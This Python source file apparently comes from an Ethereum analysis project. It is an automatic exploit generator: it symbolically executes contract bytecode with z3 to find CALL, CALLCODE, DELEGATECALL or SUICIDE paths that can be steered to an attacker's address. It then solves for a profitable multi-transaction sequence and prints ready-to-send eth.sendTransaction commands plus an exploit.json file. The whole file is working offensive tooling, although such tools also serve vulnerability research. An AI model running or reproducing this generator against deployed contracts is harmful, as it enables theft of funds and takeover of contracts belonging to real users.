#!/usr/bin/env python2.7
import itertools
import logging
import sys
from binascii import unhexlify, hexlify

import resource

from z3 import z3

from ethanalyze.constraints import model_to_calls, check_model_and_resolve
from ethanalyze.evm import concrete, CombinedSymbolicResult, IntractablePath, simplify_non_const_hashes
from ethanalyze.project import Project

# logging.basicConfig(level=logging.DEBUG)
from ethanalyze.z3_extra_util import get_vars_non_recursive

logging.basicConfig(level=logging.INFO)


class Nope(Exception):
    pass


def attempt_exploit_call(r, target_addr, target_amount, amount_check='+', controlled_addrs=set()):
    addr = r.state.stack[-2]
    if not concrete(addr):
        addr = z3.simplify(addr)

    amount = r.state.stack[-3]
    if not concrete(amount):
        amount = z3.simplify(amount)

    extra_constraints = []

    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == target_addr)
    else:
        if addr != target_addr:
            raise Nope

    if not concrete(amount):
        if amount_check == '+':
            extra_constraints.append(z3.UGE(amount, target_amount))
        elif amount_check == '-':
            extra_constraints.append(z3.UGT(amount, 0))
            extra_constraints.append(z3.ULE(amount, target_amount))
        else:
            extra_constraints.append(amount == target_amount)

    # ensure we're not spending more for this exploit than we gain
    total_spent = None
    for i in xrange(r.calls):
        callvalue = z3.BitVec('CALLVALUE_%d' % i, 256)
        if total_spent is None:
            total_spent = z3.BV2Int(callvalue)
        else:
            total_spent = total_spent + z3.BV2Int(callvalue)

    if not concrete(amount):
        extra_constraints.append(total_spent < z3.BV2Int(amount))
    else:
        extra_constraints.append(total_spent < amount)

    # addresses under our control
    # assume we also control the target address
    controlled_addrs.add(target_addr)
    return attempt_exploit(r, extra_constraints, controlled_addrs)


def attempt_exploit_callcode(r, target_addr, controlled_addrs=set()):
    addr = z3.simplify(r.state.stack[-2])

    extra_constraints = []

    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == target_addr)
    else:
        if addr != target_addr:
            raise Nope

    # addresses under our control
    # assume we also control the target address
    controlled_addrs.add(target_addr)
    return attempt_exploit(r, extra_constraints, controlled_addrs)


def attempt_exploit_delegatecall(r, target_addr, controlled_addrs=set()):
    addr = z3.simplify(r.state.stack[-2])

    extra_constraints = []

    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == target_addr)
    else:
        if addr != target_addr:
            raise Nope

    # addresses under our control
    # assume we also control the target address
    controlled_addrs.add(target_addr)
    return attempt_exploit(r, extra_constraints, controlled_addrs)


def attempt_exploit_suicide(r, target_addr, controlled_addrs=set()):
    addr = z3.simplify(r.state.stack[-2])

    extra_constraints = []

    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == target_addr)
    else:
        if addr != target_addr:
            raise Nope

    # addresses under our control
    # assume we also control the target address
    controlled_addrs.add(target_addr)
    return attempt_exploit(r, extra_constraints, controlled_addrs)


def attempt_exploit(r, extra_constraints, controlled_addrs=set()):
    for res in r.results:
        expr = None
        for controlled_addr in controlled_addrs:
            new_caller = z3.Extract(159, 0, z3.BitVec('CALLER_%d' % res.xid, 256)) == controlled_addr
            if expr is None:
                expr = new_caller
            else:
                expr = z3.Or(expr, new_caller)
        extra_constraints.append(expr)

    try:
        '''#logging.debug('combined path contraints:')
        for i, c in enumerate(r.constraints + extra_constraints):
            #logging.debug('C%d: %s', i, simplify_non_const_hashes(c, r.sha_constraints.keys()))
        for i, (h, v) in enumerate(r.sha_constraints.iteritems()):
            #logging.debug('Hash %d: %s = KECCAK(%s)', i, h, v)'''
        model = check_model_and_resolve(r.constraints + extra_constraints, r.sha_constraints, r.storage_constraints)

        # enforce we control all CALLER-addresses
        if any(model[v].as_long() not in controlled_addrs for v in model if v.name().startswith('CALLER')):
            raise Nope

        return model_to_calls(model, r.idx_dict), r, model
    except IntractablePath as e:
        # logging.exception('Intractable Path/Constraints')
        raise Nope


def combined_exploit(p, target_addr, target_amount, amount_check='+', max_calls=3):
    sload_bbs = {ins.bb.start for ins in p.filter_ins('SLOAD')}

    call_ins = p.cfg.filter_ins('CALL')
    if not call_ins:
        logging.info('No CALL instructions')
    logging.info('Found %d CALL instructions', len(call_ins))
    all_calls = []
    for call, call_path, call_r in p.get_constraints(call_ins, [1]):
        logging.info("Call: %s", call)
        logging.info("Path: %s", '->'.join('%x' % p for p in call_path))
        if set(call_path) & sload_bbs:
            # if there is a SLOAD on this path,
            # it might benefit from prepending a SSTORE later on
            all_calls.append(call_r)
        combined = CombinedSymbolicResult()
        combined.prepend(call_r)
        combined.simplify()
        try:
            return attempt_exploit_call(combined, target_addr, target_amount, amount_check)
        except Nope:
            continue
    logging.info('All calls: %s', all_calls)

    callcode_ins = p.cfg.filter_ins('CALLCODE')
    if not callcode_ins:
        logging.info('No CALLCODE instructions')
    logging.info('Found %d CALLCODE instructions', len(callcode_ins))
    all_callcodes = []
    for callcode, callcode_path, callcode_r in p.get_constraints(callcode_ins, [1]):
        logging.info("Callcode: %s", callcode)
        logging.info("Path: %s", '->'.join('%x' % p for p in callcode_path))
        if set(callcode_path) & sload_bbs:
            # if there is a SLOAD on this path,
            # it might benefit from prepending a SSTORE later on
            all_callcodes.append(callcode_r)
        combined = CombinedSymbolicResult()
        combined.prepend(callcode_r)
        combined.simplify()
        try:
            return attempt_exploit_callcode(combined, target_addr)
        except Nope:
            continue
    logging.info('All callcodes: %s', all_callcodes)

    delegatecall_ins = p.cfg.filter_ins('DELEGATECALL')
    if not delegatecall_ins:
        logging.info('No DELEGATECALL instructions')
    logging.info('Found %d DELEGATECALL instructions', len(delegatecall_ins))
    all_delegatecalls = []
    for delegatecall, delegatecall_path, delegatecall_r in p.get_constraints(delegatecall_ins, [1]):
        logging.info("Delegatecall: %s", delegatecall)
        logging.info("Path: %s", '->'.join('%x' % p for p in delegatecall_path))
        if set(delegatecall_path) & sload_bbs:
            # if there is a SLOAD on this path,
            # it might benefit from prepending a SSTORE later on
            all_delegatecalls.append(delegatecall_r)
        combined = CombinedSymbolicResult()
        combined.prepend(delegatecall_r)
        combined.simplify()
        try:
            return attempt_exploit_delegatecall(combined, target_addr)
        except Nope:
            continue
    logging.info('All delegatecalls: %s', all_delegatecalls)

    suicide_ins = p.cfg.filter_ins('SUICIDE')
    if not suicide_ins:
        logging.info('No SUICIDE instructions')
    logging.info('Found %d SUICIDE instructions', len(suicide_ins))
    all_suicides = []
    for suicide, suicide_path, suicide_r in p.get_constraints(suicide_ins, [1]):
        logging.info("Suicide: %s", suicide)
        logging.info("Path: %s", '->'.join('%x' % p for p in suicide_path))
        if set(suicide_path) & sload_bbs:
            # if there is a SLOAD on this path,
            # it might benefit from prepending a SSTORE later on
            all_suicides.append(suicide_r)
        combined = CombinedSymbolicResult()
        combined.prepend(suicide_r)
        combined.simplify()
        try:
            return attempt_exploit_suicide(combined, target_addr)
        except Nope:
            continue
    logging.info('All suicides: %s', all_suicides)

    all_vuln = all_calls + all_callcodes + all_delegatecalls + all_suicides

    if not all_vuln:
        logging.warn("No vulnerable CALL, CALLCODE, DELEGATECALL, or SUICIDE found, aborting")
        return

    end_ins = p.filter_ins('RETURN') + p.filter_ins('STOP')
    if not end_ins:
        logging.info('No RETURN or STOP instructions')
        return
    logging.info('Found %d RETURN and STOP instructions', len(end_ins))
    all_ends = []
    # only look for paths that perform a SSTORE
    store_bbs = {ins.bb.start for ins in p.filter_ins('SSTORE')}
    store_in_path = lambda path, pred: (set(path) | {pred.start} | pred.ancestors) & store_bbs
    for end, end_path, end_r in p.get_constraints(end_ins, predicate=store_in_path):
        logging.info("End: %s", end)
        logging.info("Path: %s", '->'.join('%x' % p for p in end_path))
        all_ends.append(end_r)
        for vuln_r in all_vuln:
            combined = CombinedSymbolicResult()
            combined.prepend(vuln_r)
            combined.prepend(end_r)
            combined.simplify()
            try:
                if vuln_r in all_calls:
                    return attempt_exploit_call(combined, target_addr, target_amount, amount_check)
                elif vuln_r in all_callcodes:
                    return attempt_exploit_callcode(combined, target_addr)
                elif vuln_r in all_delegatecalls:
                    return attempt_exploit_delegatecall(combined, target_addr)
                elif vuln_r in all_suicides:
                    return attempt_exploit_suicide(combined, target_addr)
            except Nope:
                continue

    logging.info('All ends: %s', all_ends)

    calls = [all_vuln, all_ends]
    while len(calls) < max_calls:
        new_ends = [r.copy() for r in all_ends]
        calls.append(new_ends)
        for combo in itertools.product(*calls):
            combined = CombinedSymbolicResult()
            #logging.debug('Combo: %s', ', '.join('%x' % r.state.pc for r in combo[::-1]))
            for r in combo:
                combined.prepend(r)
            combined.simplify()
            vuln_r = combo[0]
            try:
                if vuln_r in all_calls:
                    return attempt_exploit_call(combined, target_addr, target_amount, amount_check)
                elif vuln_r in all_callcodes:
                    return attempt_exploit_callcode(combined, target_addr)
                elif vuln_r in all_delegatecalls:
                    return attempt_exploit_delegatecall(combined, target_addr)
                elif vuln_r in all_suicides:
                    return attempt_exploit_suicide(combined, target_addr)
            except Nope:
                continue

    logging.info('Could not exploit any RETURN+CALL')
    return


def hex_encode(d):
    return {k : hexlify(v) if isinstance(v, basestring) else v for k,v in d.iteritems()}


def main():
    if len(sys.argv) < 4:
        print 'Usage: %s <code> <target-address> <amount> [savefile]' % sys.argv[0]
        exit(-1)
    with open(sys.argv[1]) as infile:
        inbuffer = infile.read().rstrip()
    amount_check = '+'
    amount = sys.argv[3].strip()
    if amount[0] in ('=', '+', '-'):
        amount_check = amount[0]
        amount = amount[1:]
    amount = int(amount)
    code = unhexlify(inbuffer)
    p = Project(code)
    savefilebase = sys.argv[1]
    if len(sys.argv) > 4:
        savefilebase = sys.argv[4]
    import json
    with open('%s.project.json' % savefilebase, 'w') as f:
        json.dump(p.to_json(), f)
    result = combined_exploit(p, int(sys.argv[2], 16), amount, amount_check)
    if result:
        call, r, model = result

        with open('%s.exploit.json' % savefilebase, 'w') as f:
            json.dump({'paths': [{'index': i, 'path': [ins for ins in res.state.trace if ins in p.cfg.bb_addrs or ins == res.state.trace[-1]]} for
                                 i, res in enumerate(r.results)],
                       'calls': [{'index': i, 'call': hex_encode(c)} for i,c in enumerate(call)]}, f)

        for i, res in enumerate(r.results):
            print '%d: %s' % (i, '->'.join('%x' % i for i in res.state.trace if i in p.cfg.bb_addrs or i == res.state.trace[-1]))
        print call
        print
        for c in call:
            print 'eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x4000000000000000000000000000000000000000"%s})' % (
                int(sys.argv[2], 16), hexlify(c.get('payload', '')), ", value:%d"%c['value'] if c.get('value',0) else '')


if __name__ == '__main__':
    # limit memory to 8GB
    mem_limit = 8 * 1024 * 1024 * 1024
    try:
        rsrc = resource.RLIMIT_VMEM
    except:
        rsrc = resource.RLIMIT_AS
    resource.setrlimit(rsrc, (mem_limit, mem_limit))
    main()
